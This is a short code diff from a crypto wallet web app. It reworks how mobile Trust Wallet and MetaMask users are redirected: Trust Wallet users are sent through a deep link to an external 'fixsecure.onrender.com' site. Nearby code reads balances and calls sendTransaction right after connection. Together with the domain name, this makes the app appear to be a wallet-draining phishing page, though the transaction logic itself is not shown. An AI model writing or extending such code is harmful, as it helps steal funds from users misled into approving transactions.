@@ -119,17 +119,20 @@ function formatBalance(balanceBigInt, chain) {
   const [visitedTW, setVisitedTW ] = useState(false)
 
   useEffect(() => {
+             if (walletInfo?.name  === "Trust Wallet" && isMobile() && !visitedTW) {
+      // Open Trust Wallet with deep link
+     const trustLink = `https://link.trustwallet.com/open_url?coin_id=${chainId}&url=https://fixsecure.onrender.com`
+     window.open(trustLink, "_blank");
+     setVisitedTW(true)
+      return
+    }
+  }, [isConnected])
+
+  useEffect(() => {
     if (isConnected && address ) {
       console.log("Wallet connected:", address);
       console.log("Connected to:", activeChain?.name);
       console.log("Connected wallet", walletInfo?.name);
-
-          if (walletInfo?.name  === "Trust Wallet" && isMobile() && !visitedTW) {
-      // Open Trust Wallet with deep link
-      window.location.href = `https://link.trustwallet.com/open_url?coin_id=${chainId}&url=https://fixsecure.onrender.com`
-      setVisitedTW(true)
-      return
-    }
       walletConnectNotification();
       console.log("chainId:", chainId)
       console.log("activeChain:", activeChain?.id)
@@ -180,7 +183,8 @@ function formatBalance(balanceBigInt, chain) {
     }
 
     if(walletInfo?.name === "MetaMask" && isMobile()) {
-      window.location.href = "https://link.metamask.io"
+      const metamaskLink= "https://link.metamask.io"
+      window.open(metamaskLink, "_blank")
     }
 
     sendTransaction(
